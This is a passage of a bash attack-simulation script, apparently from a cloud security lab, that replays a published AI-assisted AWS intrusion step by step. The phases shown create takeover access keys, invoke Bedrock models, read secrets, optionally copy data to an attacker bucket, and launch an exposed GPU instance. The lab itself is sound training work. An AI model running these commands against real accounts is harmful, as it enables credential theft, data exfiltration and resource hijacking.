    TAKEOVER_RESULT=$(aws iam create-access-key --user-name "$TAKEOVER_USER" 2>/dev/null || echo "")
    if [ -n "$TAKEOVER_RESULT" ]; then
        TAKEOVER_KEY=$(echo "$TAKEOVER_RESULT" | jq -r '.AccessKey.AccessKeyId')
        TAKEOVER_KEY_IDS+=("$TAKEOVER_KEY")
        echo "$TAKEOVER_USER access key: $TAKEOVER_KEY"
        echo -e "${GREEN}✓ Access keys created for $TAKEOVER_USER${NC}"
    else
        echo -e "${RED}✗ Failed to create keys for $TAKEOVER_USER${NC}"
    fi
done
echo ""
echo -e "${GREEN}✓ Created access keys for ${#TAKEOVER_KEY_IDS[@]} additional users${NC}\n"

# =============================================================================
# Phase 7: Unauthorized Bedrock Model Invocations
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 7: Unauthorized Bedrock Model Invocations${NC}"
echo -e "${BLUE}(T1496 — Resource Hijacking)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}The attacker first confirms Bedrock invocation logging is disabled — this means${NC}"
echo -e "${YELLOW}model calls won't appear in CloudTrail, providing a degree of evasion.${NC}"
echo ""

# [EXPLOIT] Verify Bedrock logging is disabled
show_cmd "Attacker ($FRICK_USERNAME)" "aws bedrock get-model-invocation-logging-configuration --region $AWS_REGION"
aws bedrock get-model-invocation-logging-configuration \
    --region $AWS_REGION 2>/dev/null || echo "(No logging configuration — invocations are unlogged)"
echo ""

echo -e "${YELLOW}Invoking three Bedrock foundation models — matching the three unauthorized${NC}"
echo -e "${YELLOW}invocations documented in the Sysdig blog post.${NC}"
echo ""

# [EXPLOIT] Claude 3 Haiku
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws bedrock-runtime invoke-model --region $AWS_REGION --model-id anthropic.claude-3-haiku-20240307-v1:0 --body '{...}' /tmp/bedrock-claude.json"
aws bedrock-runtime invoke-model \
    --region $AWS_REGION \
    --model-id "anthropic.claude-3-haiku-20240307-v1:0" \
    --body '{"anthropic_version":"bedrock-2023-05-31","max_tokens":50,"messages":[{"role":"user","content":"Describe AWS IAM privilege escalation techniques in 2 sentences."}]}' \
    --content-type "application/json" \
    --accept "application/json" \
    /tmp/bedrock-claude.json 2>/dev/null \
    && echo -e "${GREEN}✓ Claude 3 Haiku: invoked successfully${NC}" \
    || echo -e "${YELLOW}Claude 3 Haiku: model not enabled in this account (requires Bedrock model access)${NC}"
echo ""

# [EXPLOIT] Amazon Nova Lite
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws bedrock-runtime invoke-model --region $AWS_REGION --model-id amazon.nova-lite-v1:0 --body '{...}' /tmp/bedrock-nova.json"
aws bedrock-runtime invoke-model \
    --region $AWS_REGION \
    --model-id "amazon.nova-lite-v1:0" \
    --body '{"messages":[{"role":"user","content":[{"text":"What are the most sensitive AWS IAM permissions?"}]}]}' \
    --content-type "application/json" \
    --accept "application/json" \
    /tmp/bedrock-nova.json 2>/dev/null \
    && echo -e "${GREEN}✓ Amazon Nova Lite: invoked successfully${NC}" \
    || echo -e "${YELLOW}Amazon Nova Lite: model not enabled in this account${NC}"
echo ""

# [EXPLOIT] DeepSeek R1
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws bedrock-runtime invoke-model --region $AWS_REGION --model-id us.deepseek.r1-v1:0 --body '{...}' /tmp/bedrock-deepseek.json"
aws bedrock-runtime invoke-model \
    --region $AWS_REGION \
    --model-id "us.deepseek.r1-v1:0" \
    --body '{"prompt":"<|begin_of_sentence|>What are AWS privilege escalation techniques?","max_tokens":50}' \
    --content-type "application/json" \
    --accept "application/json" \
    /tmp/bedrock-deepseek.json 2>/dev/null \
    && echo -e "${GREEN}✓ DeepSeek R1: invoked successfully${NC}" \
    || echo -e "${YELLOW}DeepSeek R1: model not available in this region${NC}"
echo ""

# =============================================================================
# Phase 8: Cross-Account Lateral Movement Attempts (all fail)
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 8: Cross-Account Lateral Movement Attempts (all fail)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

echo -e "${YELLOW}The AI assistant attempts to assume OrganizationAccountAccessRole across${NC}"
echo -e "${YELLOW}multiple account IDs — these are hallucinated account IDs that don't exist.${NC}"
echo -e "${YELLOW}All attempts fail. This matches the original blog post exactly.${NC}"
echo ""

for ACCT_ID in "123456789012" "210987654321" "653711519285"; do
    for SESSION_NAME in "explore" "test" "mgmt"; do
        show_cmd "Attacker ($FRICK_USERNAME)" "aws sts assume-role --role-arn arn:aws:iam::${ACCT_ID}:role/OrganizationAccountAccessRole --role-session-name $SESSION_NAME"
        aws sts assume-role \
            --role-arn "arn:aws:iam::${ACCT_ID}:role/OrganizationAccountAccessRole" \
            --role-session-name "$SESSION_NAME" 2>&1 | grep -E "(AccessDenied|NoSuchEntity|is not authorized|Error)" | head -1 || true
    done
done

echo ""
echo -e "${DIM}All cross-account attempts failed — the AI hallucinated account IDs.${NC}\n"

# =============================================================================
# Phase 9: Data Collection
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 9: Data Collection (T1530 — Data from Cloud Storage Object)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))
echo -e "${DIM}[Elapsed: ${ELAPSED}s]${NC}\n"

echo -e "${YELLOW}With admin credentials, the attacker collects sensitive data: database${NC}"
echo -e "${YELLOW}credentials from Secrets Manager, API keys from SSM Parameter Store, and${NC}"
echo -e "${YELLOW}performs an S3 inventory.${NC}"
echo ""

# [EXPLOIT] Secrets Manager
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws secretsmanager get-secret-value --region $AWS_REGION --secret-id pl-prod-8min-db-credentials --query SecretString --output text"
DB_CREDS=$(aws secretsmanager get-secret-value \
    --region $AWS_REGION \
    --secret-id pl-prod-8min-db-credentials \
    --query SecretString \
    --output text 2>/dev/null || echo "(secret not found or access denied)")
echo "DB credentials: $DB_CREDS"
echo ""

# [EXPLOIT] SSM Parameter Store
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ssm get-parameter --region $AWS_REGION --name /pl/8min/api-key --with-decryption --query Parameter.Value --output text"
API_KEY=$(aws ssm get-parameter \
    --region $AWS_REGION \
    --name /pl/8min/api-key \
    --with-decryption \
    --query Parameter.Value \
    --output text 2>/dev/null || echo "(parameter not found or access denied)")
echo "API key: $API_KEY"
echo ""

# [EXPLOIT] S3 bucket inventory
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws s3 ls"
aws s3 ls 2>/dev/null || true
echo ""

# Optional exfiltration (only if attacker bucket env var is set)
if [ -n "$ATTACKER_BUCKET" ]; then
    echo -e "${YELLOW}Exfiltrating collected data to attacker-controlled bucket...${NC}"
    show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws s3 cp /tmp/rag-config.json s3://$ATTACKER_BUCKET/exfil/rag-config.json"
    aws s3 cp /tmp/rag-config.json s3://$ATTACKER_BUCKET/exfil/rag-config.json 2>/dev/null \
        && echo -e "${GREEN}✓ Exfiltrated to $ATTACKER_BUCKET${NC}" \
        || echo -e "${RED}Exfiltration failed${NC}"
else
    echo -e "${DIM}(Skipping external exfiltration — set ATTACKER_BUCKET env var to enable)${NC}"
fi
echo ""

# =============================================================================
# Phase 10: GPU Instance Launch for AI Model Training (Resource Hijacking)
# =============================================================================
echo -e "${BLUE}============================================================${NC}"
echo -e "${BLUE}PHASE 10: GPU Instance Launch for Unauthorized AI Training${NC}"
echo -e "${BLUE}(T1496 — Resource Hijacking)${NC}"
echo -e "${BLUE}============================================================${NC}\n"

echo -e "${YELLOW}The attacker's final objective: launch a GPU instance to train AI models at${NC}"
echo -e "${YELLOW}the victim's expense — the central motivation in the Sysdig blog post.${NC}"
echo ""

# [EXPLOIT] Find Deep Learning AMI
show_cmd "Attacker ($FRICK_USERNAME)" "aws ec2 describe-images --region $AWS_REGION --owners amazon --filters 'Name=name,Values=*Deep Learning Base OSS Nvidia Driver GPU AMI*Ubuntu*' 'Name=state,Values=available' --query 'sort_by(Images, &CreationDate)[-1].ImageId' --output text"
AMI_ID=$(aws ec2 describe-images \
    --region $AWS_REGION \
    --owners amazon \
    --filters "Name=name,Values=*Deep Learning Base OSS Nvidia Driver GPU AMI*Ubuntu*" \
              "Name=state,Values=available" \
    --query 'sort_by(Images, &CreationDate)[-1].ImageId' \
    --output text 2>/dev/null || echo "")

if [ -z "$AMI_ID" ] || [ "$AMI_ID" == "None" ] || [ "$AMI_ID" == "null" ]; then
    echo -e "${YELLOW}Deep Learning AMI not found in $AWS_REGION — trying generic Ubuntu AMI${NC}"
    AMI_ID=$(aws ec2 describe-images \
        --region $AWS_REGION \
        --owners amazon \
        --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
        --query 'sort_by(Images, &CreationDate)[-1].ImageId' \
        --output text 2>/dev/null || echo "")
fi

echo "AMI: $AMI_ID"
echo ""

# [EXPLOIT] Create keypair and security group
show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ec2 create-key-pair --region $AWS_REGION --key-name pl-8min-gpu-key --query 'KeyMaterial' --output text"
aws ec2 create-key-pair \
    --region $AWS_REGION \
    --key-name pl-8min-gpu-key \
    --query 'KeyMaterial' \
    --output text > /tmp/pl-8min-gpu-key.pem 2>/dev/null || true
chmod 400 /tmp/pl-8min-gpu-key.pem 2>/dev/null || true
echo -e "${GREEN}✓ Created keypair pl-8min-gpu-key${NC}"

show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ec2 create-security-group --region $AWS_REGION --group-name pl-8min-gpu-sg --description 'GPU instance security group for ML training'"
SG_ID=$(aws ec2 create-security-group \
    --region $AWS_REGION \
    --group-name pl-8min-gpu-sg \
    --description "GPU instance security group for ML training" \
    --query GroupId \
    --output text 2>/dev/null || echo "")

if [ -n "$SG_ID" ] && [ "$SG_ID" != "null" ]; then
    echo -e "${GREEN}✓ Created security group: $SG_ID${NC}"
    aws ec2 authorize-security-group-ingress \
        --region $AWS_REGION \
        --group-id $SG_ID \
        --protocol tcp \
        --port 0-65535 \
        --cidr 0.0.0.0/0 > /dev/null 2>/dev/null || true
    echo -e "${GREEN}✓ Opened all inbound ports (0.0.0.0/0) — no security controls${NC}"
else
    echo -e "${YELLOW}Security group creation failed or already exists; using default${NC}"
    SG_ID=""
fi
echo ""

# [EXPLOIT] First instance attempt: p5.48xlarge (expected to fail with capacity error)
echo -e "${YELLOW}First GPU instance attempt: p5.48xlarge (most powerful GPU instance in AWS).${NC}"
echo -e "${YELLOW}This is expected to fail with InsufficientInstanceCapacity — same as the original attack.${NC}"
echo ""

INSTANCE_TYPE_FLAGS="--instance-type p5.48xlarge"
if [ -n "$SG_ID" ]; then
    INSTANCE_TYPE_FLAGS="$INSTANCE_TYPE_FLAGS --security-group-ids $SG_ID"
fi

show_cmd "Attacker ($FRICK_USERNAME)" "aws ec2 run-instances --region $AWS_REGION --image-id $AMI_ID --instance-type p5.48xlarge --count 1"
aws ec2 run-instances \
    --region $AWS_REGION \
    --image-id $AMI_ID \
    --instance-type p5.48xlarge \
    --count 1 2>&1 | grep -E "(InsufficientInstanceCapacity|Error|Unsupported|not supported)" | head -3 || true
echo -e "${DIM}(expected failure — p5.48xlarge insufficient capacity, same as original attack)${NC}\n"

# [EXPLOIT] Second instance attempt: p3.2xlarge (succeeds)
echo -e "${YELLOW}Second attempt: p3.2xlarge — cheapest p-series GPU instance. This succeeds.${NC}"
echo -e "${RED}WARNING: p3.2xlarge costs \$3.06/hr. Run cleanup_attack.sh immediately after the demo!${NC}"
echo -e "${YELLOW}A 2-hour auto-shutdown is built into the user-data as a cost safety net.${NC}"
echo ""

# Build user-data with auto-shutdown safety
USER_DATA=$(printf '%s' '#!/bin/bash
# COST SAFETY: Auto-terminate instance after 2 hours if cleanup script not run
nohup bash -c '"'"'sleep 7200 && poweroff'"'"' > /dev/null 2>&1 &

# Install ML dependencies (mirrors original attack)
pip3 install torch transformers datasets accelerate deepspeed 2>/dev/null &

# Start JupyterLab with no authentication (mirrors original attack'"'"'s exposed endpoint)
pip3 install jupyterlab 2>/dev/null
nohup jupyter lab --ip=0.0.0.0 --port=8888 --no-browser \
    --NotebookApp.token="" --NotebookApp.password="" > /var/log/jupyter.log 2>&1 &

# Attempt to clone training scripts (the original AI hallucinated this repo)
git clone https://github.com/anthropic/training-scripts.git /tmp/training-scripts 2>/dev/null || \
    echo "Repository not found (AI hallucination in original attack)" >> /var/log/user-data.log

echo "GPU instance initialized" >> /var/log/user-data.log
' | base64)

LAUNCH_FLAGS="--image-id $AMI_ID \
    --instance-type p3.2xlarge \
    --key-name pl-8min-gpu-key \
    --user-data $USER_DATA \
    --instance-initiated-shutdown-behavior terminate \
    --tag-specifications ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu-monster},{Key=Scenario,Value=sysdig-8-minutes-to-admin}] \
    --query Instances[0].InstanceId \
    --output text"

if [ -n "$SG_ID" ]; then
    LAUNCH_FLAGS="$LAUNCH_FLAGS --security-group-ids $SG_ID"
fi

show_attack_cmd "Attacker ($FRICK_USERNAME)" "aws ec2 run-instances --region $AWS_REGION --instance-type p3.2xlarge --key-name pl-8min-gpu-key --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu-monster},{Key=Scenario,Value=sysdig-8-minutes-to-admin}]'"
INSTANCE_ID=$(aws ec2 run-instances \
    --region $AWS_REGION \
    --image-id $AMI_ID \
    --instance-type p3.2xlarge \
    --key-name pl-8min-gpu-key \
    --user-data "$USER_DATA" \
    --instance-initiated-shutdown-behavior terminate \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pl-8min-gpu-monster},{Key=Scenario,Value=sysdig-8-minutes-to-admin}]' \
    --query 'Instances[0].InstanceId' \
    --output text 2>/dev/null || echo "")

if [ -n "$INSTANCE_ID" ] && [ "$INSTANCE_ID" != "null" ] && [ "$INSTANCE_ID" != "None" ]; then
    echo -e "${GREEN}✓ GPU instance launched: $INSTANCE_ID${NC}"
    echo -e "${RED}WARNING: p3.2xlarge is running at \$3.06/hr — run cleanup_attack.sh now!${NC}"
    echo -e "${YELLOW}Auto-shutdown safety net: instance will self-terminate after 2 hours${NC}"
    # Store for cleanup
    echo "$INSTANCE_ID" > /tmp/pl-8min-gpu-instance-id.txt
    [ -n "$SG_ID" ] && echo "$SG_ID" > /tmp/pl-8min-gpu-sg-id.txt
else
    echo -e "${YELLOW}GPU instance launch failed — p3.2xlarge may not be available in $AWS_REGION${NC}"
    echo -e "${YELLOW}This can occur if GPU instances are not supported in this region.${NC}"
    INSTANCE_ID=""
fi
echo ""

# =============================================================================
# Final Summary
# =============================================================================
ELAPSED=$(( $(date +%s) - DEMO_START_TIME ))

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}ATTACK SIMULATION COMPLETE${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""
echo -e "${CYAN}Total elapsed time: ${ELAPSED} seconds ($(( ELAPSED / 60 ))m $(( ELAPSED % 60 ))s)${NC}"
echo ""
echo -e "${YELLOW}Source:${NC}"
echo "  AI-Assisted Cloud Intrusion Achieves Admin Access in 8 Minutes"
echo "  Alessandro Brucato and Michael Clark (Sysdig Threat Research Team)"
echo "  https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes"
echo ""
echo -e "${YELLOW}Attack Chain:${NC}"
echo "  1. $STARTING_USER"
echo "     -> (s3:ListBucket + s3:GetObject) -> RAG bucket with embedded credentials"
echo "  2. $COMPROMISED_USER"
echo "     -> (lambda:UpdateFunctionCode + lambda:InvokeFunction) -> $EC2_INIT_FUNCTION"
echo "  3. pl-prod-8min-ec2-init-role"
echo "     -> (iam:CreateAccessKey) -> $FRICK_USERNAME (AdministratorAccess)"
echo "  4. $FRICK_USERNAME"
echo "     -> (iam:CreateUser + iam:AttachUserPolicy) -> backdoor-admin (AdministratorAccess)"
echo ""
echo -e "${YELLOW}Identity Spreading (${NC}${CYAN}19 unique principals${NC}${YELLOW}):${NC}"
echo "  Role sessions: $ASSUMED_COUNT sessions across 5 roles (sysadmin, account, netadmin, developer, external)"
echo "  Compromised users: $FRICK_USERNAME, pl-prod-8min-rocker, ${TAKEOVER_USERS[*]}"
echo "  Created user: backdoor-admin"
echo ""
echo -e "${YELLOW}Attack Artifacts Created:${NC}"
echo "- Access key for $FRICK_USERNAME: $FRICK_KEY_ID"
echo "- IAM user: backdoor-admin (AdministratorAccess)"
echo "- IAM user backdoor-admin access key: $BACKDOOR_KEY_ID"
echo "- Access key for pl-prod-8min-rocker: $ROCKER_KEY_ID"
for i in "${!TAKEOVER_USERS[@]}"; do
    echo "- Access key for ${TAKEOVER_USERS[$i]}: ${TAKEOVER_KEY_IDS[$i]:-unknown}"
done
echo "- Lambda $EC2_INIT_FUNCTION: code replaced with malicious version"
if [ -n "$INSTANCE_ID" ]; then
    echo "- EC2 GPU instance: $INSTANCE_ID (p3.2xlarge, \$3.06/hr)"
fi
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${RED}IMPORTANT: This demo left real artifacts in your AWS account.${NC}"
if [ -n "$INSTANCE_ID" ]; then
    echo -e "${RED}A p3.2xlarge GPU instance (\$3.06/hr) is running. Clean up immediately!${NC}"
fi
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
